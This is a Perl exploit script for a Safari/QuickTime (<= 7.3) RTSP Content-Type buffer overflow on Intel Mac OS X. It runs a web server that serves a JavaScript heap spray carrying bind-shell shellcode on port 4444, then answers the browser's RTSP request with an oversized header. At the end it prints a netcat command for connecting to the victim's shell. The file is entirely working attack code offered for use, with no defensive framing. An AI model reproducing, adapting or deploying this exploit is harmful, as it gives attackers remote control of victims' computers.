#!/usr/bin/perl
#
# quickbite.pl
#
# Safari + Quicktime <= 7.3 RTSP Content-Type overflow exploit
# for Mac OS X (Intel)
#
# Tested with OS X 10.4.
# On victim, browse to http://server:8080/
# Binds shell on port 4444.
#
# by krafty
# 
# greets to sk, halvar, grugq, and all the ethnical hackers
# extra thanks to ddz for osx hackery
# sec-con greets to secwest, blackhat, hitb, hacklu, itu, xcon, syscan, poc
# sux to exploit traders - ZDI, WabiSabiLabi, and all you h0arders.
# milw0rm and packetstorm rule
# Bring back the days of technotronic and r00tshell! Freedom.
#
# Why is this exploit called "Quickbite"? Here's a dumb Apple joke:
# "What's worse than biting into an apple and finding a worm?"
# "Finding half a worm".

use Socket;
use IO::Handle;
use constant MY_HTTP_PORT => 8080;

$shellcode = "%uc031%u6850%u02ff%u5c11%ue789%u6a50%u6a01%u6a02%ub010%ucd61%u5780%u5050%u686a%ucd58%u8980%uec47%u6ab0%u80cd%u1eb0%u80cd%u5050%u5a6a%ucd58%uff80%ue44f%uf679%u6850%u2f2f%u6873%u2f68%u6962%u896e%u50e3%u5454%u5053%u3bb0%u80cd";
$buf = chr(0x11) x 6000;

# don't touch anything below this line
$html = <<ENDHTML;
<script>
var prefix = unescape("%u3166%uB0C0%uCD42%uFE80%u3CC0%u7501%uB004%uCD01%u9080");
var shellcode = unescape("$shellcode");
shellcode = prefix + shellcode;
var spray = unescape("%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090");
do {
   spray += spray;
} while(spray.length < 0xc0000);
memory = new Array();
for(i = 0; i < 50; i++)
   memory[i] = spray + shellcode;
var url = "rtsp://" + location.host + "/x.mp3";
document.write("<EMBED SRC='" + url + "' TYPE='video/quicktime' AUTOPLAY='true' />");
</script>
ENDHTML

$rtsp_body = 
"v=0\r\n" .
"o=- 16689332712 1 IN IP4 0.0.0.0\r\n" .
"s=MPEG-1 or 2 Audio\r\n" .
"i=1.mp3\r\n" .
"t=0 0\r\n" .
"a=tool:hello\r\n" .
"a=type:broadcast\r\n" .
"a=control:*\r\n" .
"a=range:npt=0-213.077\r\n" .
"a=x-qt-text-nam:MPEG-1 or 2 Audio\r\n" .
"a=x-qt-text-inf:1.mp3\r\n" .
"m=audio 0 RTP/AVP 14\r\n" .
"c=IN IP4 0.0.0.0\r\n" .
"a=control:track1\r\n";
$content_length = length($rtsp_body);
$rtsp_header =
"RTSP/1.0 200 OK\r\n" .
"CSeq: 1\r\n" .
"Date: 0x00 :P\r\n" .
"Content-Base: rtsp://0.0.0.0/x.mp3/\r\n" .
"Content-Type: $buf\r\n" .
"Content-Length: $content_length\r\n\r\n";
$rtsp = $rtsp_header . $rtsp_body;
$http_header = "HTTP/1.1 200 OK\nContent-type: text/html\n\n";
$| = 1;

my $port = MY_HTTP_PORT;
my $protocol = getprotobyname('tcp');

socket(SOCK, AF_INET, SOCK_STREAM, $protocol) or die "socket() failed: $!";
setsockopt(SOCK,SOL_SOCKET,SO_REUSEADDR,1) or die "Can't set SO_REUSEADDR: $!";
my $my_addr = sockaddr_in($port,INADDR_ANY);
bind(SOCK,$my_addr) or die "bind() failed: $!";
listen(SOCK,SOMAXCONN) or die "listen() failed: $!";
warn "waiting for incoming connections on port $port...\n";

$repeat = 1;
$victim = inet_aton("0.0.0.0");
while($repeat) {
    next unless my $remote_addr = accept(SESSION,SOCK);
    my ($port,$hisaddr) = sockaddr_in($remote_addr);
    warn "Connection from [",inet_ntoa($hisaddr),",$port]\n";
    $victim = $hisaddr;
    SESSION->autoflush(1);
    $request = "";
    while(<SESSION>) {
	$request_line = $_;
	$request .= $request_line;
	chomp($request_line);
        if($request_line =~ /DESCRIBE rtsp/) {
           $repeat = 0;
        }
	$x = length($request_line);
	if($x <= 1) {
	    last;
	}
    }
    print STDERR $request;
    if($repeat) {
       print SESSION $http_header . $html;
    }
    else {
       print SESSION $rtsp;
    }
    warn "Connection from [",inet_ntoa($hisaddr),",$port] finished\n";
    close SESSION;
}
print "Connect to ".inet_ntoa($victim).":4444 after 5 seconds\n";
print "nc -nvv ".inet_ntoa($victim)." 4444\nEnjoy!\n";
